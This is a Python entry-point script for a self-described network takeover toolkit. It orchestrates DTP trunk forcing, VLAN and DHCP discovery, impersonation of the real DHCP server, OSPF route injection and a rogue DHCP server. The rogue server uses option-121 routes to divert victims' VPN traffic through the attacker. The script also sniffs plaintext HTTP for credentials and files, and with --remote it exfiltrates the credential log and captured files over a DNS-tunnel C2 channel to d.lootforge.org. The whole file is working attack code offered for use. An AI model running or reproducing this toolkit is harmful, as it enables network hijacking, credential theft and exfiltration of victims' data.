#!/usr/bin/env python3
# v2.0
"""
main.py — network takeover toolkit entry point.

Orchestrates four modules in /final:

    dhcp_takeover   DTP trunking, VLAN discovery, DHCP discovery, identity theft,
                    and the rogue DHCP server (OFFER/ACK/NAK/RELEASE, opt121, DNS).
    ospf_adjacency  OSPFv2 full-adjacency engine that injects a host route for our
                    stolen DHCP-server IP (launched in its own terminal).
    vpn_relay       Detect/start the host VPN, then selectively relay victim traffic
                    bound for VPN subnets through the tunnel while everything else
                    passes straight to the real default gateway.
    http_intercept  Capture HTTP credentials and downloaded objects from the
                    plaintext traffic we now carry.
    dns_c2          DNS tunnel C2 client (loaded only when --remote is passed).

Usage:
    sudo python3 main.py [--remote] [--domain DOMAIN] [--dns-server IP]

Options:
    --remote / -r       Activate DNS tunnel C2 mode.  Performs a handshake to
                        confirm the server is alive, then starts command polling.
                        The debug menu's "Transmit to C2" option is enabled.
    --domain DOMAIN     DNS zone for the C2 channel  (default: d.lootforge.org)
    --dns-server IP     Resolver to use for C2 traffic  (default: system resolver)

Before running, set DEFAULT_INTERFACE in dhcp_takeover.py to the interface facing
the target network (default: "eth0").  Root is required for raw sockets, iptables,
and interface/route changes.  Linux (Kali) only.

End-to-end flow:
    1.  DTP trunk negotiation + PVST+ VLAN discovery.
    2.  DHCPDISCOVER sweep across VLANs; capture DHCPOFFERs.
    3.  Steal the offered client IP (static), inject a host route via OSPF, and
        add the real DHCP server's IP to our loopback (identity theft).
    4.  Detect the host VPN (start OpenVPN from an autologin profile if needed).
        Derive the target /24 from the tun interface's assigned IP — e.g. tun0
        gets 10.8.0.90/28, so we target 10.8.0.0/24 (covers the full class-C
        regardless of what narrow prefix the VPN server assigned).
    5.  Inject option 121 with exactly two routes: <tun /24> via our identity
        (victims send VPN-subnet traffic to us, relayed through the tunnel), and
        0.0.0.0/0 via the real router (all other traffic goes direct — fast path).
    6.  Sniff the carried plaintext for credentials and downloaded files.
    7.  Serve DHCP as the rogue server until interrupted.
"""

import argparse
import os
import sys
import threading
import time
from queue import Queue

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import ospf_adjacency
import vpn_relay
import http_intercept

from dhcp_takeover import (
    print_step,
    DEFAULT_INTERFACE,
    DEFAULT_DHCP_DISCOVER_VLANS,
    IMPERSONATE_REAL_SERVER,
    force_trunk,
    countdown,
    start_periodic_dtp_trunking,
    stop_periodic_dtp_trunking,
    sniff_pvst,
    get_discovered_vlan_ids,
    send_DHCPDiscover_VLANs,
    sniff_worker,
    get_original_dhcp_server_ip,
    ensure_vlan_subinterface,
    set_static_address_from_offer,
    wait_for_interface_ipv4_address,
    add_loopback_ipv4_address,
    build_server_details_from_offer,
    sniff_for_dhcp_discover_and_request,
)


# ── CLI argument parsing ───────────────────────────────────────────────────────

def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="main.py",
        description="Network takeover toolkit (DHCP + OSPF + VPN relay + HTTP capture)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--remote", "-r",
        action="store_true",
        help="Activate DNS tunnel C2 mode (handshake + command polling + file exfil)",
    )
    parser.add_argument(
        "--domain",
        default="d.lootforge.org",
        metavar="DOMAIN",
        help="DNS zone for the C2 channel",
    )
    parser.add_argument(
        "--dns-server",
        default=None,
        metavar="IP",
        dest="dns_server",
        help="Resolver for C2 traffic (default: auto-detected system resolver)",
    )
    return parser.parse_args()


# ── C2 initialisation ─────────────────────────────────────────────────────────

def _init_c2(args) -> dict | None:
    """
    Perform handshake with the DNS C2 server.

    Returns a c2_config dict on success, or None if the handshake fails or
    --remote was not passed.  The dict is threaded through to the debug menu.
    """
    if not args.remote:
        return None

    import dns_c2 as _c2

    dns_server = args.dns_server or _c2.get_system_dns()
    agent_id = _c2.gen_agent_id()

    print_step("START", f"C2 mode — domain={args.domain}  resolver={dns_server}  agent={agent_id}")
    if not _c2.perform_handshake(agent_id, args.domain, dns_server):
        print_step("WARN", "C2 handshake failed — continuing without remote mode")
        return None

    _c2.start_command_poll(args.domain, dns_server)
    print_step("OK", f"C2 ready — command poll every {_c2.COMMAND_POLL_INTERVAL}s")
    return {"domain": args.domain, "dns_server": dns_server, "agent_id": agent_id}


# ── Debug menu ────────────────────────────────────────────────────────────────

def _show_subnets(networks: list) -> None:
    if not networks:
        print("  (no networks tracked yet — clients must request a lease first)")
        return
    for net in networks:
        print(f"  Network  : {net['network']}")
        print(f"  Mask     : {net['subnet_mask']}")
        print(f"  Router   : {net.get('router') or 'n/a'}")
        print(f"  VLAN     : {net.get('vlan_id') or 'none'}")
        print(f"  Mode     : {net['mode']}")
        print(f"  Leases   : {len(net['leased_addresses'])}")
        print()


def _show_leases(networks: list) -> None:
    total = 0
    for net in networks:
        for ip in sorted(net["leased_addresses"]):
            vlan = net.get("vlan_id") or "—"
            print(f"  {ip:17s}  net={net['network']}  vlan={vlan}")
            total += 1
    if total == 0:
        print("  (no confirmed leases yet)")
    else:
        print(f"\n  Total: {total} confirmed lease(s)")


def _show_intercepted() -> None:
    intercept_dir = http_intercept.INTERCEPT_DIR
    cred_log = http_intercept.CRED_LOG

    tun = vpn_relay._fwd_tun_iface
    phys = vpn_relay._fwd_phys_iface
    if tun:
        print(f"  VPN relay active: {phys} → {tun}")
        print(f"  HTTP intercept running on: {tun}")
    else:
        print("  VPN relay: inactive (passthrough mode)")
    print()

    files = []
    if os.path.isdir(intercept_dir):
        for fname in sorted(os.listdir(intercept_dir)):
            fpath = os.path.join(intercept_dir, fname)
            try:
                size = os.path.getsize(fpath)
            except OSError:
                size = 0
            files.append((fname, fpath, size))

    if files:
        print(f"  Intercepted HTTP objects ({intercept_dir}):")
        for fname, _, size in files:
            print(f"    {fname:<45s} {size:>9d} B")
        total_bytes = sum(s for _, _, s in files)
        print(f"\n  {len(files)} file(s) — {total_bytes:,} B total")
    else:
        print(f"  No intercepted objects yet  ({intercept_dir})")

    print()
    if os.path.isfile(cred_log) and os.path.getsize(cred_log) > 0:
        print(f"  Credential log ({cred_log}):")
        try:
            with open(cred_log) as f:
                for line in f:
                    print(f"    {line.rstrip()}")
        except OSError as exc:
            print(f"  (could not read cred log: {exc})")
    else:
        print(f"  No credentials captured yet  ({cred_log})")


def _transmit_to_c2(c2_config: dict) -> None:
    import dns_c2 as _c2

    domain = c2_config["domain"]
    dns_server = c2_config["dns_server"]
    intercept_dir = http_intercept.INTERCEPT_DIR
    cred_log = http_intercept.CRED_LOG
    sent = 0

    if os.path.isfile(cred_log) and os.path.getsize(cred_log) > 0:
        print(f"  Sending credential log → C2...")
        if _c2.exfiltrate_file(cred_log, domain, dns_server):
            sent += 1

    n = _c2.exfiltrate_dir(intercept_dir, domain, dns_server)
    sent += n

    if sent == 0:
        print("  Nothing to transmit — no credentials or intercepted files yet.")
    else:
        print(f"  Transmitted {sent} file(s) to C2.")


def debug_menu(networks: list, proposed_leases: dict, server_details: dict, c2_config: dict | None = None) -> None:
    """
    Interactive debug console.  Runs in a daemon thread while the DHCP sniff
    loop blocks the main thread.

    Always available options:
      1  Discovered subnets / DHCP networks
      2  Active leases issued by the rogue server
      3  Intercepted VPN traffic (files) and captured credentials

    Remote-only option (requires --remote and a successful C2 handshake):
      4  Transmit intercepted files and credentials to C2 over DNS tunnel
    """
    time.sleep(2)  # let startup output settle
    while True:
        sep = "─" * 52
        print(f"\n{sep}")
        print("  Debug Console")
        print(sep)
        print("  1)  Discovered subnets")
        print("  2)  Active leases")
        print("  3)  Intercepted traffic / credentials")
        if c2_config:
            print(f"  4)  Transmit to C2  (agent={c2_config['agent_id']})")
        print("  q)  Close menu (server keeps running)")
        print(sep)

        try:
            choice = input("debug> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break

        if choice == "1":
            _show_subnets(networks)
        elif choice == "2":
            _show_leases(networks)
        elif choice == "3":
            _show_intercepted()
        elif choice == "4" and c2_config:
            _transmit_to_c2(c2_config)
        elif choice == "q":
            print("  Debug menu closed.")
            break
        else:
            print(f"  Unknown option: {choice!r}")


# ── DHCP phases ───────────────────────────────────────────────────────────────

def discover_offers(interface):
    """Run the threaded DHCPDISCOVER sweep and return the captured offers.

    In a relay topology (ip helper-address) the DHCPOFFER can arrive within
    tens of milliseconds.  Scapy's sniff() needs ~100–200 ms to open its raw
    socket and install the BPF filter.  If DISCOVERs are sent before the
    sniffer is ready the OFFERs race past and are never captured — the 30 s
    window expires with nothing.

    Fix: wait 1 s after the sniffer thread starts (bind-wait), then retry
    DISCOVERs every 8 s so any missed OFFERs are recovered on subsequent
    attempts.  Three attempts span 17 s; the 30 s sniffer window covers all.
    """
    pvst_network_map = sniff_pvst(interface)
    discovered_vlan_ids = get_discovered_vlan_ids(pvst_network_map)
    if discovered_vlan_ids:
        print_step("OK", f"Using PVST+ discovered VLANs for DHCP probes: {discovered_vlan_ids}")
        dhcp_probe_vlan_ids = discovered_vlan_ids
    else:
        print_step(
            "WARN",
            "No PVST+ VLANs discovered; falling back to the configured "
            f"DHCPDISCOVER VLAN sweep: {list(DEFAULT_DHCP_DISCOVER_VLANS)}",
        )
        dhcp_probe_vlan_ids = DEFAULT_DHCP_DISCOVER_VLANS

    result_queue = Queue()
    sniffer_thread = threading.Thread(target=sniff_worker, args=(interface, result_queue))

    print_step("START", "Starting DHCPOFFER sniffer thread")
    sniffer_thread.start()

    # Give the sniffer socket time to bind before sending.  Without this the
    # OFFERs can arrive before the BPF filter is installed and are silently
    # dropped.  1 s is conservative; the thread typically binds in < 300 ms.
    time.sleep(1)

    for attempt in range(1, 4):  # attempts at t≈1 s, 9 s, 17 s
        if not sniffer_thread.is_alive():
            break
        if attempt > 1:
            print_step(
                "START",
                f"No OFFERs captured yet — retrying DHCPDISCOVER sweep "
                f"(attempt {attempt}/3)",
            )
        print_step("START", f"Sending DHCPDISCOVER packets across VLANs (attempt {attempt}/3)")
        send_DHCPDiscover_VLANs(interface, dhcp_probe_vlan_ids)
        if attempt < 3:
            time.sleep(8)  # wait for OFFERs before the next attempt

    sniffer_thread.join()

    offers = result_queue.get()
    print_step("OK", f"Received {len(offers)} DHCPOFFER result(s)")
    return offers


def steal_dhcp_identity(interface, selected_offer):
    """Take over the offered IP, form OSPF adjacency, and add the server identity.

    Returns the interface OSPF/DHCP runs on (a VLAN subinterface when tagged).
    """
    selected_vlan_id = selected_offer.get("vlan")
    original_dhcp_server_ip = get_original_dhcp_server_ip(selected_offer)

    print_step("START", f"Stealing DHCP server identity {original_dhcp_server_ip}")
    ospf_interface = ensure_vlan_subinterface(interface, selected_vlan_id)
    selected_address = set_static_address_from_offer(ospf_interface, selected_offer)
    wait_for_interface_ipv4_address(ospf_interface, expected_address=selected_address)
    add_loopback_ipv4_address(original_dhcp_server_ip)
    print_step("OK", f"DHCP server identity {original_dhcp_server_ip} active on loopback")

    # OSPF engine runs in its own terminal so its interactive menu stays usable.
    ospf_adjacency.launch_in_terminal(
        ospf_interface,
        vlan_id=selected_vlan_id,
        auto_route_ip=original_dhcp_server_ip,
    )
    ospf_adjacency.wait_for_adjacency_exchange(ospf_interface, selected_address)
    return ospf_interface


def start_http_intercept(sniff_iface):
    """Launch the HTTP credential/object interceptor in a daemon thread."""
    print_step("START", f"Starting HTTP interceptor on {sniff_iface}")
    print_step("OK", f"Credential log: {os.path.abspath(http_intercept.CRED_LOG)}")
    print_step("OK", f"HTTP objects  : {http_intercept.INTERCEPT_DIR}")
    thread = threading.Thread(
        target=http_intercept.sniff_loop,
        kwargs={"iface": sniff_iface},
        daemon=True,
    )
    thread.start()
    return thread


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    print("Network Takeover Toolkit v2.7 — Starting...")
    args = _parse_args()
    interface = DEFAULT_INTERFACE  # set in dhcp_takeover.py

    # ── C2 handshake (before any network activity so operator confirms aliveness)
    c2_config = _init_c2(args)

    # ── Phase 1: trunk + VLAN discovery ──────────────────────────────────────
    force_trunk(interface)
    countdown("Allowing trunk negotiation to settle", 10)

    dtp_stop_event, dtp_thread = start_periodic_dtp_trunking(interface)
    try:
        # ── Phase 2: DHCP discovery ──────────────────────────────────────────
        offers = discover_offers(interface)
        if not offers:
            print_step("FAIL", "No DHCPOFFER packets received — aborting")
            return

        # ── Phase 3: identity theft (static IP + OSPF + loopback) ────────────
        selected_offer = offers[0]
        ospf_interface = steal_dhcp_identity(interface, selected_offer)

        # ── Phase 4+5: VPN relay + option 121 policy ─────────────────────────
        networks = []
        proposed_leases = {}
        server_details = build_server_details_from_offer(ospf_interface, selected_offer, offers)
        tun_iface = vpn_relay.enable_vpn_relay(server_details, ospf_interface)

        # ── Phase 6: HTTP interception on the traffic we now carry ───────────
        # Prefer the tunnel (plaintext VPN traffic); fall back to the physical
        # interface when there is no VPN relay.
        start_http_intercept(tun_iface or ospf_interface)

        # ── Debug console — runs in background while Phase 7 blocks ──────────
        debug_thread = threading.Thread(
            target=debug_menu,
            args=(networks, proposed_leases, server_details, c2_config),
            daemon=True,
            name="debug-menu",
        )
        debug_thread.start()

        # ── Phase 7: rogue DHCP server (blocking) ────────────────────────────
        relay_mode = (
            f"VPN relay via {tun_iface} → {server_details.get('opt121_subnets')}"
            if tun_iface else "passthrough only"
        )
        print_step(
            "START",
            f"Rogue DHCP server starting — {relay_mode} | "
            f"impersonate={'ON' if IMPERSONATE_REAL_SERVER else 'OFF'}",
        )
        handled_events = sniff_for_dhcp_discover_and_request(
            networks,
            proposed_leases,
            server_details,
        )
        print_step("OK", f"DHCP server finished: {len(handled_events)} event(s) handled")
        return handled_events
    finally:
        stop_periodic_dtp_trunking(dtp_stop_event, dtp_thread)


if __name__ == "__main__":
    main()
